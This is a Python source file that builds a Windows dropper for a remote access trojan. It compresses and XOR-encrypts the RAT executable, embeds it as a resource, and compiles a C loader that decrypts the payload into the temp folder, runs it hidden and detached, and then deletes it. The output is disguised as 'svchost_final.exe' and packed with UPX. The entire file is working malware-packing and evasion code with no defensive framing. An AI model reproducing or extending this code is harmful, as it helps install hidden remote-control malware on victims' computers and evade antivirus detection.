"""
Compact Loader Builder - Creates single EXE with binary resource
"""

import os
import sys
import subprocess
import shutil
import random
import string
import zlib
from pathlib import Path

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def build_loader(original_exe_path):
    print("=" * 60)
    print("COMPACT LOADER BUILDER")
    print("=" * 60)
    
    if not os.path.exists(original_exe_path):
        print(f"EXE not found: {original_exe_path}")
        return None
    
    output_dir = os.path.dirname(original_exe_path)
    
    print("Reading RAT EXE...")
    with open(original_exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"RAT size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    print(f"Compressed: {len(compressed) / (1024*1024):.1f} MB")
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    data_bin = os.path.join(output_dir, 'rat_data.bin')
    with open(data_bin, 'wb') as f:
        f.write(encrypted)
    
    key_bin = os.path.join(output_dir, 'key.bin')
    with open(key_bin, 'wb') as f:
        f.write(key)
    
    print("Creating loader EXE with binary resource...")
    
    rc_content = '''
#include <windows.h>
IDR_RAT_DATA RCDATA "rat_data.bin"
IDR_RAT_KEY RCDATA "key.bin"
'''
    
    rc_file = os.path.join(output_dir, 'resource.rc')
    with open(rc_file, 'w', encoding='utf-8') as f:
        f.write(rc_content)
    
    loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

#define IDR_RAT_DATA 101
#define IDR_RAT_KEY 102

void xor_decrypt(unsigned char* data, int len, unsigned char* key, int key_len) {
    for(int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

void run_rat() {
    HMODULE hModule = GetModuleHandleA(NULL);
    
    HRSRC hResData = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_DATA), "RCDATA");
    if (!hResData) return;
    
    HGLOBAL hData = LoadResource(hModule, hResData);
    if (!hData) return;
    
    DWORD data_size = SizeofResource(hModule, hResData);
    unsigned char* enc_data = (unsigned char*)LockResource(hData);
    
    HRSRC hResKey = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_KEY), "RCDATA");
    if (!hResKey) return;
    
    HGLOBAL hKey = LoadResource(hModule, hResKey);
    if (!hKey) return;
    
    DWORD key_size = SizeofResource(hModule, hResKey);
    unsigned char* key_data = (unsigned char*)LockResource(hKey);
    
    unsigned char* decrypted = (unsigned char*)malloc(data_size);
    if (!decrypted) return;
    memcpy(decrypted, enc_data, data_size);
    
    xor_decrypt(decrypted, data_size, key_data, key_size);
    
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    
    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    char filename[13];
    for(int i = 0; i < 12; i++) {
        filename[i] = chars[rand() % 36];
    }
    filename[12] = '\\0';
    sprintf(temp_file, "%s%s.exe", temp_path, filename);
    
    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, decrypted, data_size, &written, NULL);
        CloseHandle(hFile);
        
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(temp_file, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        Sleep(5000);
        DeleteFileA(temp_file);
    }
    
    free(decrypted);
}

int main() {
    run_rat();
    return 0;
}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling loader with resources...")
    loader_exe = os.path.join(output_dir, 'svchost_final.exe')
    
    res_obj = os.path.join(output_dir, 'resource.o')
    
    cmd_res = ['windres', '-i', rc_file, '-o', res_obj]
    try:
        subprocess.run(cmd_res, check=True, capture_output=True)
    except Exception as e:
        print(f"Resource compilation failed: {e}")
        return None
    
    cmd = [
        'gcc',
        loader_src,
        res_obj,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Compilation error: {result.stderr}")
            return None
    except Exception as e:
        print(f"Compilation failed: {e}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True)
    except:
        pass
    
    original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Original RAT: {original_size:.1f} MB")
    print(f"Final loader: {final_size:.2f} MB")
    print("=" * 60)
    
    try:
        os.remove(rc_file)
        os.remove(res_obj)
        os.remove(data_bin)
        os.remove(key_bin)
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/rat_temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_loader(exe_path)
